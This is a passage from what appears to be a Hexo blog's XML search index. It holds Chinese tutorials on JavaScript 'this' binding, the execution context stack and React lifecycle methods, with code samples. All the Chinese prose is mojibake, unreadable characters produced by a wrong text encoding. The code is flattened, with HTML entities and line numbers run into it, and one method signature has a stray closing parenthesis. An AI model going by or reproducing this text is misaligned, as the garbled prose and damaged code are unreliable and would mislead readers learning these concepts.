å‡½æ•°æ¨¡å¼ä¸‹ï¼ŒthisæŒ‡å‘å½“å‰æ‰§è¡Œç±»çš„å®ä¾‹ 123456function getPersonInfo(name, age) &#123; this.name = name this.age = age console.log(this)&#125;var p1 = new getPersonInfo(&apos;linda&apos;, 13) æ‰“å°å‡ºæ¥çš„å€¼æ˜¯ï¼š getPersonInfo{ name: â€˜lindaâ€™, age: 13 } ç¬¬å››ç§ï¼šcall/apply/bindè°ƒç”¨å‡½æ•°çš„æ–¹å¼ï¼ŒthisæŒ‡å‘ç¬¬ä¸€ä¸ªå‚æ•° 1234567function add (b, c) &#123; console.log(this) return this.a + b + c&#125;var obj = &#123;a: 3&#125;add.call(obj, 5, 7)add.call(obj, [10, 20]) æ‰“å°å‡ºæ¥çš„å€¼å°±æ˜¯objçš„å€¼ å¯¹äºä¸¥æ ¼æ¨¡å¼çš„jsç¨‹åºä¸­ï¼ŒthisæŒ‡å‘å¯¹äºç›´æ¥è°ƒç”¨çš„æ–¹å¼æœ‰æ‰€ä¸åŒï¼šä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œå‡½æ•°ç›´æ¥è°ƒç”¨çš„æ–¹å¼ä¸­thisæŒ‡å‘undefined 12345&apos;use strict&apos;function a() &#123; console.log(this) &#125;a() è¿™ä¸ªæ—¶å€™å‡½æ•°é‡Œçš„thisæ‰“å°å‡º undefined å¯¹äºç®­å¤´å‡½æ•°ç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªèº«çš„thiså…³é”®å­—ï¼Œçœ‹å¤–å±‚æ˜¯å¦æœ‰å‡½æ•°ï¼Œå¦‚æœæœ‰å‡½æ•°ï¼Œå¤–å±‚å‡½æ•°çš„thiså°±æ˜¯å†…éƒ¨ç®­å¤´å‡½æ•°çš„thisï¼Œå¦‚æœæ²¡æœ‰ï¼Œthiså°±æ˜¯æŒ‡å‘window å¯ä»¥çœ‹ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š 1234567891011var person = &#123; myName: &apos;linda&apos;, age:1, clickPerson: function() &#123; var show = function() &#123; console.log(`Person name is $&#123;this.myName&#125;, age is $&#123;this.age&#125;`) &#125; show() &#125;&#125;person.clickPerson() æ‰“å°ç»“æœï¼šPerson name is undefined, age is undefined é‡Œé¢çš„å‡½æ•°showè¢«è°ƒç”¨çš„æ—¶å€™ï¼Œæ˜¯æ™®é€šå‡½æ•°è°ƒç”¨çš„æƒ…å†µï¼Œæ‰€ä»¥thisæŒ‡å‘windowï¼Œè€Œå…¨å±€å‡½æ•°ä¸­æ²¡æœ‰myNameå’Œageï¼Œæ‰€ä»¥æ‰“å°å‡ºæ¥æ˜¯undefined å¯ä»¥æ¢æˆç®­å¤´å‡½æ•°ï¼š 1234567891011var person = &#123; myName: &apos;linda&apos;, age:1, clickPerson: function() &#123; var show = () =&gt; &#123; console.log(`Person name is $&#123;this.myName&#125;, age is $&#123;this.age&#125;`) &#125; show() &#125;&#125;person.clickPerson() æ‰“å°å‡ºçš„ç»“æœæ˜¯ï¼šPerson name is linda, age is 1 å¯¹äºç®­å¤´å‡½æ•°è‡ªèº«æ²¡æœ‰thiså…³é”®å­—ï¼Œæ‰€ä»¥çœ‹å¤–å±‚å‡½æ•°ï¼Œè€Œå¤–å±‚å‡½æ•°ä¸­æ˜¯æˆ‘ä»¬å‰é¢è¯´åˆ°çš„ç¬¬äºŒç§æƒ…å†µï¼ŒthisæŒ‡å‘personè¿™ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥æ˜¯æœ‰myNameå’Œageçš„å€¼ å¦‚æœæŠŠclickPersonä¹Ÿæ¢æˆç®­å¤´å‡½æ•°ï¼š 1234567891011var person = &#123; myName: &apos;linda&apos;, age:1, clickPerson: () =&gt; &#123; var show = () =&gt; &#123; console.log(`Person name is $&#123;this.myName&#125;, age is $&#123;this.age&#125;`) &#125; show() &#125;&#125;person.clickPerson() æˆ‘ä»¬å‘ç°æ‰“å°çš„ç»“æœæ˜¯ï¼šPerson name is undefined, age is undefined ç”±äºéƒ½æ˜¯ç®­å¤´å‡½æ•°ï¼Œæœ€åæ‰¾åˆ°äº†å…¨å±€çš„windowï¼Œæ‰€ä»¥thisæŒ‡å‘windowï¼Œè€Œå…¨å±€å‡½æ•°ä¸­æ²¡æœ‰myNameå’Œageï¼Œæ‰€ä»¥æ‰“å°å‡ºæ¥æ˜¯undefined å†çœ‹å¦å¤–ä¸€ä¸ªä¾‹å­ï¼š 1234567891011121314151617function getPersonInfo(name,age)&#123; this.myName = name; this.age = age; this.show = function() &#123; console.log(`Person name is $&#123;this.myName&#125;, age is $&#123;this.age&#125;`) &#125;&#125;getPersonInfo.prototype.friend = function(friends) &#123; var array = friends.map(function(friend) &#123; return `my friend $&#123;this.myName&#125; age is $&#123;this.age&#125;` &#125;); console.log(array);&#125;var person1 = new getPersonInfo(&quot;linda&quot;,18);person1.show()person1.friend([&apos;Ada&apos;, &apos;Tom&apos;]) show()å‡½æ•°è°ƒç”¨ç»“æœæ‰“å°ï¼šPerson name is linda, age is 18 friend()å‡½æ•°è°ƒç”¨æ‰“å°ç»“æœï¼š[&quot;my friend undefined age is undefined&quot;, &quot;my friend undefined age is undefined&quot;] å¯¹äºfriendå‡½æ•°å†…éƒ¨ï¼ŒthisæŒ‡å‘çš„æ˜¯å½“å‰çš„getPersonInfoè¿™ä¸ªæ„é€ å‡½æ•°åˆå§‹åŒ–çš„å®ä¾‹ï¼Œä½†æ˜¯åœ¨å†…éƒ¨ä½¿ç”¨mapæ˜¯ä¸€ä¸ªé—­åŒ…å‡½æ•°ï¼Œä¸”å†…éƒ¨æ˜¯æ™®é€šå‡½æ•°çš„è°ƒç”¨æ–¹å¼ï¼Œæ‰€ä»¥å†…éƒ¨thisæ˜¯æŒ‡å‘äº†windowï¼Œå¯ä»¥æŠŠé‡Œé¢æ™®é€šå‡½æ•°è°ƒç”¨çš„æ–¹å¼æ”¹æˆç®­å¤´å‡½æ•°çš„æ–¹å¼å³å¯ 1234567891011121314151617function getPersonInfo(name,age)&#123; this.myName = name; this.age = age; this.show = function() &#123; console.log(`Person name is $&#123;this.myName&#125;, age is $&#123;this.age&#125;`) &#125;&#125;getPersonInfo.prototype.friend = function(friends) &#123; var array = friends.map((friend) =&gt; &#123; return `my friend $&#123;this.myName&#125; age is $&#123;this.age&#125;` &#125;); console.log(array);&#125;var person1 = new getPersonInfo(&quot;linda&quot;,18);person1.show()person1.friend([&apos;Ada&apos;, &apos;Tom&apos;]) è¿™æ¬¡æ‰“å°ç»“æœå°±æ˜¯[&quot;my friend linda age is 18&quot;, &quot;my friend linda age is 18&quot;]å°±æ˜¯æˆ‘ä»¬é¢„æƒ³çš„äº† æ€»ç»“ï¼šï¼ˆéä¸¥æ ¼æ¨¡å¼ä¸‹ï¼‰å¯ä»¥æŒ‰ç…§ä¸‹å›¾è§„å¾‹æŸ¥æ‰¾thisçš„æŒ‡å‘ äº”ã€æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆjsåˆ›å»ºäº†æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆæ¥ç®¡ç†æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œæˆ‘ä»¬é€šè¿‡å¦‚ä¸‹ä¸€æ®µä»£ç å’Œè¿›æ ˆå‡ºæ ˆé¡ºåºå›¾æ¥ç†è§£æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆ 12345678910var name = &apos;Tom&apos;;function father() &#123; var sonName = &apos;Anda&apos;; function son() &#123; console.log(&apos;son name is &apos;, sonName) &#125; console.log(&apos;father name is &apos;, name) son();&#125;father(); è¿‡ç¨‹ï¼š 1.å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡è¿›æ ˆ 2.è°ƒç”¨å‡½æ•°fatherï¼Œfatherå‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡è¿›æ ˆ 3.fatherå‡½æ•°å†…éƒ¨ä»£ç æ‰§è¡Œï¼Œsonå‡½æ•°è¢«æ‰§è¡Œï¼Œsonå‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡è¿›æ ˆ 4.sonå‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œsonå‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡å‡ºæ ˆ 5.fatherå‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œfatherå‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡å‡ºæ ˆ 6.æµè§ˆå™¨å…³é—­æ—¶ï¼Œå…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡å‡ºæ ˆ æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆç‰¹ç‚¹ï¼š å…ˆåˆ›å»ºå…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå¹¶å‹å…¥æ ˆé¡¶ å‡½æ•°æ‰§è¡Œæ—¶åˆ›å»ºå‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå†å‹å…¥æ ˆé¡¶ å‡½æ•°æ‰§è¡Œå®Œå‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡å‡ºæ ˆï¼Œç­‰å¾…åƒåœ¾å›æ”¶ JSæ‰§è¡Œå¼•æ“æ€»æ˜¯è®¿é—®æ ˆé¡¶çš„æ‰§è¡Œä¸Šä¸‹æ–‡ jsä»£ç æ˜¯å•çº¿ç¨‹çš„ï¼Œä»£ç æ˜¯æ’é˜Ÿæ‰§è¡Œ å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡åœ¨æµè§ˆå™¨å…³é—­æ—¶å‡ºæ ˆ]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½ çœŸçš„äº†è§£ React ç”Ÿå‘½å‘¨æœŸå—]]></title>
    <url>%2F2020%2F02%2F03%2FWeb%E5%89%8D%E7%AB%AF%2F%E4%BD%A0%E7%9C%9F%E7%9A%84%E4%BA%86%E8%A7%A3%20React%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%90%97%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5df648836fb9a016526eba01?utm_source=gold_browser_extension æ—§ç‰ˆç”Ÿå‘½å‘¨æœŸ åˆå§‹åŒ–çš„æ—¶å€™ä¸ä¼šæŠŠèµ‹å€¼ç®—ä½œæ›´æ–°ï¼Œæ‰€ä»¥ä¸ä¼šæ‰§è¡Œæ›´æ–°é˜¶æ®µ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788import React, &#123; Component &#125; from &apos;react&apos;export default class LifeCycle extends Component &#123; //// props = &#123;age:10,name:&apos;è®¡æ•°å™¨&apos;&#125; static defaultProps = &#123; name:&apos;è®¡æ•°å™¨&apos; &#125; constructor(props)&#123; //Must call super constructor in derived class before accessing &apos;this&apos; or returning from derived constructor super();//this.props = props; this.state = &#123;number:0,users:[]&#125;;//åˆå§‹åŒ–é»˜è®¤çš„çŠ¶æ€å¯¹è±¡ console.log(&apos;1. constructor åˆå§‹åŒ– props and state&apos;); &#125; //componentWillMountåœ¨æ¸²æŸ“è¿‡ç¨‹ä¸­å¯èƒ½ä¼šæ‰§è¡Œå¤šæ¬¡ componentWillMount()&#123; console.log(&apos;2. componentWillMount ç»„ä»¶å°†è¦æŒ‚è½½&apos;); //localStorage.get(&apos;userss&apos;); &#125; //componentDidMountåœ¨æ¸²æŸ“è¿‡ç¨‹ä¸­æ°¸è¿œåªæœ‰æ‰§è¡Œä¸€æ¬¡ //ä¸€èˆ¬æ˜¯åœ¨componentDidMountæ‰§è¡Œå‰¯ä½œç”¨ï¼Œè¿›è¡Œå¼‚æ­¥æ“ä½œ componentDidMount()&#123; console.log(&apos;4. componentDidMount ç»„ä»¶æŒ‚è½½å®Œæˆ&apos;); fetch(&apos;https://api.github.com/users&apos;).then(res=&gt;res.json()).then(users=&gt;&#123; console.log(users); this.setState(&#123;users&#125;); &#125;); &#125; shouldComponentUpdate(nextProps,nextState)&#123; console.log(&apos;Counter&apos;,nextProps,nextState); console.log(&apos;5. shouldComponentUpdate è¯¢é—®ç»„ä»¶æ˜¯å¦éœ€è¦æ›´æ–°&apos;); return true; &#125; componentWillUpdate(nextProps, nextState)&#123; console.log(&apos;6. componentWillUpdate ç»„ä»¶å°†è¦æ›´æ–°&apos;); &#125; componentDidUpdate(prevProps, prevState))&#123; console.log(&apos;7. componentDidUpdate ç»„ä»¶æ›´æ–°å®Œæ¯•&apos;); &#125; add = ()=&gt;&#123; this.setState(&#123;number:this.state.number&#125;); &#125;; render() &#123; console.log(&apos;3.renderæ¸²æŸ“ï¼Œä¹Ÿå°±æ˜¯æŒ‚è½½&apos;) return ( &lt;div style=&#123;&#123;border:&apos;5px solid red&apos;,padding:&apos;5px&apos;&#125;&#125;&gt; &lt;p&gt;&#123;this.props.name&#125;:&#123;this.state.number&#125;&lt;/p&gt; &lt;button onClick=&#123;this.add&#125;&gt;+&lt;/button&gt; &lt;ul&gt; &#123; this.state.users.map(user=&gt;(&lt;li&gt;&#123;user.login&#125;&lt;/li&gt;)) &#125; &lt;/ul&gt; &#123;this.state.number%2==0&amp;&amp;&lt;SubCounter number=&#123;this.state.number&#125;/&gt;&#125; &lt;/div&gt; ) &#125;&#125;class SubCounter extends Component&#123; constructor(props)&#123; super(props); this.state = &#123;number:0&#125;; &#125; componentWillUnmount()&#123; console.log(&apos;SubCounter componentWillUnmount&apos;); &#125; //è°ƒç”¨æ­¤æ–¹æ³•çš„æ—¶å€™ä¼šæŠŠæ–°çš„å±æ€§å¯¹è±¡å’Œæ–°çš„çŠ¶æ€å¯¹è±¡ä¼ è¿‡æ¥ shouldComponentUpdate(nextProps,nextState)&#123; console.log(&apos;SubCounter&apos;,nextProps,nextState); if(nextProps.number%3==0)&#123; return true; &#125;else&#123; return false; &#125; &#125; //componentWillReceiveProp ç»„ä»¶æ”¶åˆ°æ–°çš„å±æ€§å¯¹è±¡ componentWillReceiveProps()&#123; console.log(&apos;SubCounter 1.componentWillReceiveProps&apos;) &#125; render()&#123; console.log(&apos;SubCounter 2.render&apos;) return( &lt;div style=&#123;&#123;border:&apos;5px solid green&apos;&#125;&#125;&gt; &lt;p&gt;&#123;this.props.number&#125;&lt;/p&gt; &lt;/div&gt; ) &#125;&#125; æ´‹è‘±æ¨¡å‹ æ–°ç‰ˆç”Ÿå‘½å‘¨æœŸ static getDerivedStateFromProps static getDerivedStateFromProps(nextProps,prevState)ï¼šæ¥æ”¶çˆ¶ç»„ä»¶ä¼ é€’è¿‡æ¥çš„ props å’Œç»„ä»¶ä¹‹å‰çš„çŠ¶æ€ï¼Œè¿”å›ä¸€ä¸ªå¯¹è±¡æ¥æ›´æ–° state æˆ–è€…è¿”å› null æ¥è¡¨ç¤ºæ¥æ”¶åˆ°çš„ props æ²¡æœ‰å˜åŒ–ï¼Œä¸éœ€è¦æ›´æ–° state è¯¥ç”Ÿå‘½å‘¨æœŸé’©å­çš„ä½œç”¨ï¼š å°†çˆ¶ç»„ä»¶ä¼ é€’è¿‡æ¥çš„ props æ˜ å°„ åˆ°å­ç»„ä»¶çš„ state ä¸Šé¢ï¼Œè¿™æ ·ç»„ä»¶å†…éƒ¨å°±ä¸ç”¨å†é€šè¿‡ this.props.xxx è·å–å±æ€§å€¼äº†ï¼Œç»Ÿä¸€é€šè¿‡ this.state.xxx è·å–ã€‚æ˜ å°„å°±ç›¸å½“äºæ‹·è´äº†ä¸€ä»½çˆ¶ç»„ä»¶ä¼ è¿‡æ¥çš„ props ï¼Œä½œä¸ºå­ç»„ä»¶è‡ªå·±çš„çŠ¶æ€ã€‚æ³¨æ„ï¼šå­ç»„ä»¶é€šè¿‡ setState æ›´æ–°è‡ªèº«çŠ¶æ€æ—¶ï¼Œä¸ä¼šæ”¹å˜çˆ¶ç»„ä»¶çš„ props é…åˆ componentDidUpdateï¼Œå¯ä»¥è¦†ç›– componentWillReceiveProps çš„æ‰€æœ‰ç”¨æ³• è¯¥ç”Ÿå‘½å‘¨æœŸé’©å­è§¦å‘çš„æ—¶æœºï¼š åœ¨ React 16.3.0 ç‰ˆæœ¬ä¸­ï¼šåœ¨ç»„ä»¶å®ä¾‹åŒ–ã€æ¥æ”¶åˆ°æ–°çš„ props æ—¶ä¼šè¢«è°ƒç”¨ åœ¨ React 16.4.0 ç‰ˆæœ¬ä¸­ï¼šåœ¨ç»„ä»¶å®ä¾‹åŒ–ã€æ¥æ”¶åˆ°æ–°çš„ props ã€ç»„ä»¶çŠ¶æ€æ›´æ–°æ—¶ä¼šè¢«è°ƒç”¨ åœ¨çº¿ demo â€”â€” æµ‹è¯• 16.3.0 å’Œ 16.4.0 ç‰ˆæœ¬ä¸­ï¼Œè¯¥ç”Ÿå‘½å‘¨æœŸé’©å­ä»€ä¹ˆæƒ…å†µä¸‹ä¼šè¢«è§¦å‘ ä½¿ç”¨ï¼š åœ¨çº¿ demo æ³¨æ„ï¼šæ´¾ç”ŸçŠ¶æ€æ—¶ï¼Œä¸éœ€è¦æŠŠç»„ä»¶è‡ªèº«çš„çŠ¶æ€ä¹Ÿè®¾ç½®è¿›å» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import React from &quot;react&quot;;import ReactDOM from &quot;react-dom&quot;;import &quot;./styles.css&quot;;function App() &#123; return ( &lt;div className=&quot;App&quot;&gt; &lt;AAA /&gt; &lt;/div&gt; );&#125;class AAA extends React.Component &#123; state = &#123; age: 666 &#125;; add = () =&gt; &#123; this.setState(&#123; age: this.state.age + 1 &#125;); &#125;; render() &#123; return ( &lt;div&gt; &lt;ChildA onChangeParent=&#123;this.add&#125; age=&#123;this.state.age&#125; /&gt; &lt;/div&gt; ); &#125;&#125;class ChildA extends React.Component &#123; state = &#123; num: 888 &#125;; // æ ¹æ®æ–°çš„å±æ€§å¯¹è±¡æ´¾ç”ŸçŠ¶æ€å¯¹è±¡ // nextPropsâ€”â€”æ–°çš„å±æ€§å¯¹è±¡ prevStateâ€”â€”æ—§çš„çŠ¶æ€å¯¹è±¡ static getDerivedStateFromProps(nextprops, state) &#123; console.log(&apos;props&apos;,nextprops); // è¿”å›ä¸€ä¸ªå¯¹è±¡æ¥æ›´æ–° state æˆ–è€…è¿”å› null æ¥è¡¨ç¤ºæ¥æ”¶åˆ°çš„ props ä¸éœ€è¦æ›´æ–° state if (nextprops.age !== state.age) &#123; console.log(&quot;æ›´æ–°å§&quot;); return &#123; onChangeParent:nextprops.onChangeParent, age: nextprops.age, // æ³¨æ„ï¼šè¿™é‡Œä¸éœ€è¦æŠŠç»„ä»¶è‡ªèº«çš„çŠ¶æ€ä¹Ÿæ”¾è¿›æ¥ // num:state.num &#125;; &#125; return null; &#125; add = () =&gt; &#123; this.setState(&#123; num: this.state.num + 1 &#125;); &#125;; render() &#123; const &#123; onChangeParent &#125; = this.state; console.log(&apos;state&apos;,this.state); return ( &lt;&gt; &lt;div onClick=&#123;onChangeParent&#125;&gt;change&lt;/div&gt; &lt;div onClick=&#123;this.add&#125;&gt;add&lt;/div&gt; &lt;/&gt; ); &#125;&#125;const rootElement = document.getElementById(&quot;root&quot;);ReactDOM.render(&lt;App /&gt;, rootElement); getSnapshotBeforeUpdate getSnapshotBeforeUpdate(prevProps, prevState)ï¼šæ¥æ”¶çˆ¶ç»„ä»¶ä¼ é€’è¿‡æ¥çš„ props å’Œç»„ä»¶ä¹‹å‰çš„çŠ¶æ€ï¼Œæ­¤ç”Ÿå‘½å‘¨æœŸé’©å­å¿…é¡»æœ‰è¿”å›å€¼ï¼Œè¿”å›å€¼å°†ä½œä¸ºç¬¬ä¸‰ä¸ªå‚æ•°ä¼ é€’ç»™ componentDidUpdateã€‚å¿…é¡»å’Œ componentDidUpdate ä¸€èµ·ä½¿ç”¨ï¼Œå¦åˆ™ä¼šæŠ¥é”™ è¯¥ç”Ÿå‘½å‘¨æœŸé’©å­è§¦å‘çš„æ—¶æœº ï¼šè¢«è°ƒç”¨äº render ä¹‹åã€æ›´æ–° DOM å’Œ refs ä¹‹å‰ è¯¥ç”Ÿå‘½å‘¨æœŸé’©å­çš„ä½œç”¨ï¼š å®ƒèƒ½è®©ä½ åœ¨ç»„ä»¶æ›´æ–° DOM å’Œ refs ä¹‹å‰ï¼Œä» DOM ä¸­æ•è·ä¸€äº›ä¿¡æ¯ï¼ˆä¾‹å¦‚æ»šåŠ¨ä½ç½®ï¼‰ é…åˆ componentDidUpdate, å¯ä»¥è¦†ç›– componentWillUpdate çš„æ‰€æœ‰ç”¨æ³• åœ¨çº¿ demoï¼šæ¯æ¬¡ç»„ä»¶æ›´æ–°æ—¶ï¼Œéƒ½å»è·å–ä¹‹å‰çš„æ»šåŠ¨ä½ç½®ï¼Œè®©ç»„ä»¶ä¿æŒåœ¨ä¹‹å‰çš„æ»šåŠ¨ä½ç½® 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import React, &#123; Component &#125; from &quot;react&quot;;import ReactDOM from &quot;react-dom&quot;;import &quot;./styles.css&quot;;function App() &#123; return ( &lt;div className=&quot;App&quot;&gt; &lt;GetSnapshotBeforeUpdate /&gt; &lt;/div&gt; );&#125;class GetSnapshotBeforeUpdate extends Component &#123; constructor(props) &#123; super(props); this.wrapper = React.createRef(); this.state = &#123; messages: [] &#125;; &#125; componentDidMount() &#123; setInterval(() =&gt; &#123; this.setState(&#123; messages: [&quot;msg:&quot; + this.state.messages.length, ...this.state.messages] &#125;); //this.setState(&#123;messages:[...this.state.messages,this.state.messages.length]&#125;); &#125;, 1000); &#125; getSnapshotBeforeUpdate() &#123; // è¿”å›æ›´æ–°å†…å®¹çš„é«˜åº¦ 300px return this.wrapper.current.scrollHeight; &#125; componentDidUpdate(prevProps, prevState, prevScrollHeight) &#123; this.wrapper.current.scrollTop = this.wrapper.current.scrollTop + (this.wrapper.current.scrollHeight - prevScrollHeight); &#125; render() &#123; let style = &#123; height: &quot;100px&quot;, width: &quot;200px&quot;, border: &quot;1px solid red&quot;, overflow: &quot;auto&quot; &#125;; return ( &lt;ul style=&#123;style&#125; ref=&#123;this.wrapper&#125;&gt; &#123;this.state.messages.map((message, index) =&gt; ( &lt;li key=&#123;index&#125;&gt;&#123;message&#125;&lt;/li&gt; ))&#125; &lt;/ul&gt; ); &#125;&#125;const rootElement = document.getElementById(&quot;root&quot;);ReactDOM.render(&lt;App /&gt;, rootElement); ç‰ˆæœ¬è¿ç§» componentWillMountï¼ŒcomponentWillReceivePropsï¼ŒcomponentWillUpdate è¿™ä¸‰ä¸ªç”Ÿå‘½å‘¨æœŸå› ä¸ºç»å¸¸ä¼šè¢«è¯¯è§£å’Œæ»¥ç”¨ï¼Œæ‰€ä»¥è¢«ç§°ä¸º ä¸å®‰å…¨ï¼ˆä¸æ˜¯æŒ‡å®‰å…¨æ€§ï¼Œè€Œæ˜¯è¡¨ç¤ºä½¿ç”¨è¿™äº›ç”Ÿå‘½å‘¨æœŸçš„ä»£ç ï¼Œæœ‰å¯èƒ½åœ¨æœªæ¥çš„ React ç‰ˆæœ¬ä¸­å­˜åœ¨ç¼ºé™·ï¼Œå¯èƒ½ä¼šå½±å“æœªæ¥çš„å¼‚æ­¥æ¸²æŸ“ï¼‰ çš„ç”Ÿå‘½å‘¨æœŸã€‚ React 16.3 ç‰ˆæœ¬ï¼šä¸ºä¸å®‰å…¨çš„ç”Ÿå‘½å‘¨æœŸå¼•å…¥åˆ«å UNSAFE_componentWillMountï¼ŒUNSAFE_componentWillReceiveProps å’Œ UNSAFE_componentWillUpdateã€‚ï¼ˆæ—§çš„ç”Ÿå‘½å‘¨æœŸåç§°å’Œæ–°çš„åˆ«åéƒ½å¯ä»¥åœ¨æ­¤ç‰ˆæœ¬ä¸­ä½¿ç”¨ï¼‰ React 16.3 ä¹‹åçš„ç‰ˆæœ¬ï¼šä¸º componentWillMountï¼ŒcomponentWillReceiveProps å’Œ componentWillUpdate å¯ç”¨å¼ƒç”¨è­¦å‘Šã€‚ï¼ˆæ—§çš„ç”Ÿå‘½å‘¨æœŸåç§°å’Œæ–°çš„åˆ«åéƒ½å¯ä»¥åœ¨æ­¤ç‰ˆæœ¬ä¸­ä½¿ç”¨ï¼Œä½†æ—§åç§°ä¼šè®°å½•DEVæ¨¡å¼è­¦å‘Šï¼‰ React 17.0 ç‰ˆæœ¬ï¼š æ¨å‡ºæ–°çš„æ¸²æŸ“æ–¹å¼â€”â€”å¼‚æ­¥æ¸²æŸ“ï¼ˆ Async Renderingï¼‰ï¼Œæå‡ºä¸€ç§å¯è¢«æ‰“æ–­çš„ç”Ÿå‘½å‘¨æœŸï¼Œè€Œå¯ä»¥è¢«æ‰“æ–­çš„é˜¶æ®µæ­£æ˜¯å®é™… dom æŒ‚è½½ä¹‹å‰çš„è™šæ‹Ÿ dom æ„å»ºé˜¶æ®µï¼Œä¹Ÿå°±æ˜¯è¦è¢«å»æ‰çš„ä¸‰ä¸ªç”Ÿå‘½å‘¨æœŸ componentWillMountï¼ŒcomponentWillReceiveProps å’Œ componentWillUpdateã€‚ï¼ˆä»è¿™ä¸ªç‰ˆæœ¬å¼€å§‹ï¼Œåªæœ‰æ–°çš„â€œUNSAFE_â€ç”Ÿå‘½å‘¨æœŸåç§°å°†èµ·ä½œç”¨ï¼‰ å¸¸è§é—®é¢˜å½“å¤–éƒ¨çš„ props æ”¹å˜æ—¶ï¼Œå¦‚ä½•å†æ¬¡æ‰§è¡Œè¯·æ±‚æ•°æ®ã€æ›´æ”¹çŠ¶æ€ç­‰æ“ä½œä½¿ç”¨ componentWillReceiveProps12345678910111213141516171819202122232425262728293031323334353637383940class ExampleComponent extends React.Component &#123; state = &#123; externalData: null, &#125;; componentDidMount() &#123; this._loadAsyncData(this.props.id); &#125; componentWillReceiveProps(nextProps) &#123; // å½“çˆ¶ç»„ä»¶çš„ props æ”¹å˜æ—¶ï¼Œé‡æ–°è¯·æ±‚æ•°æ® if (nextProps.id !== this.props.id) &#123; this.setState(&#123;externalData: null&#125;); this._loadAsyncData(nextProps.id); &#125; &#125; componentWillUnmount() &#123; if (this._asyncRequest) &#123; this._asyncRequest.cancel(); &#125; &#125; render() &#123; if (this.state.externalData === null) &#123; // Render loading state ... &#125; else &#123; // Render real UI ... &#125; &#125; _loadAsyncData(id) &#123; this._asyncRequest = asyncLoadData(id).then( externalData =&gt; &#123; this._asyncRequest = null; this.setState(&#123;externalData&#125;); &#125; ); &#125;&#125; ä½¿ç”¨ getDerivedStateFromProps + componentDidUpdate åŠ è½½æ•°æ®12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849class ExampleComponent extends React.Component &#123; state = &#123; externalData: null, &#125;; static getDerivedStateFromProps(nextProps, prevState) &#123; if (nextProps.id !== prevState.prevId) &#123; return &#123; externalData: null, prevId: nextProps.id, &#125;; &#125; return null; &#125; componentDidMount() &#123; this._loadAsyncData(this.props.id); &#125; // å€ŸåŠ© componentDidUpdate componentDidUpdate(prevProps, prevState) &#123; if (this.state.externalData === null) &#123; this._loadAsyncData(this.props.id); &#125; &#125; componentWillUnmount() &#123; if (this._asyncRequest) &#123; this._asyncRequest.cancel(); &#125; &#125; render() &#123; if (this.state.externalData === null) &#123; // Render loading state ... &#125; else &#123; // Render real UI ... &#125; &#125; _loadAsyncData(id) &#123; this._asyncRequest = asyncLoadData(id).then( externalData =&gt; &#123; this._asyncRequest = null; this.setState(&#123;externalData&#125;); &#125; ); &#125;&#125; ä½¿ç”¨ getDerivedStateFromProps æ›´æ”¹çŠ¶æ€ åœ¨çº¿ demo 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import React from &quot;react&quot;;import ReactDOM from &quot;react-dom&quot;;import &quot;./styles.css&quot;;function App() &#123; return ( &lt;div className=&quot;App&quot;&gt; &lt;AAA /&gt; &lt;/div&gt; );&#125;class AAA extends React.Component &#123; state = &#123; age: 66 &#125;; add = () =&gt; &#123; this.setState(&#123; age: this.state.age + 1 &#125;); &#125;; render() &#123; return ( &lt;div&gt; &lt;ChildA onChangeParent=&#123;this.add&#125; age=&#123;this.state.age&#125; /&gt; &lt;/div&gt; ); &#125;&#125;class ChildA extends React.Component &#123; state = &#123; num: 88 &#125;; static getDerivedStateFromProps(nextProps, prevState) &#123; if (nextProps.age !== prevState.age) &#123; return &#123; age: nextProps.age &#125;; &#125; return null; &#125; add = () =&gt; &#123; this.setState(&#123; num: this.state.num + 1 &#125;); &#125;; render() &#123; const &#123; onChangeParent &#125; = this.props; console.log(&quot;render&quot;, this.state); return ( &lt;&gt; &lt;div onClick=&#123;onChangeParent&#125;&gt;change&lt;/div&gt; &lt;div onClick=&#123;this.add&#125;&gt;add&lt;/div&gt; &lt;/&gt; ); &#125;&#125;const rootElement = document.getElementById(&quot;root&quot;);ReactDOM.render(&lt;App /&gt;, rootElement); åªç”¨ componentDidUpdate çš„å†™æ³• ä¸ä¸€å®šè¦ä½¿ç”¨ getDerivedStateFromProps æˆ–è€… componentWillReceiveProps åœ¨çº¿ demo 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import React from &quot;react&quot;;import ReactDOM from &quot;react-dom&quot;;import &quot;./styles.css&quot;;function App() &#123; return ( &lt;div className=&quot;App&quot;&gt; &lt;AAA /&gt; &lt;/div&gt; );&#125;class AAA extends React.Component &#123; state = &#123; age: 66 &#125;; add = () =&gt; &#123; this.setState(&#123; age: this.state.age + 1 &#125;); &#125;; render() &#123; return ( &lt;div&gt; 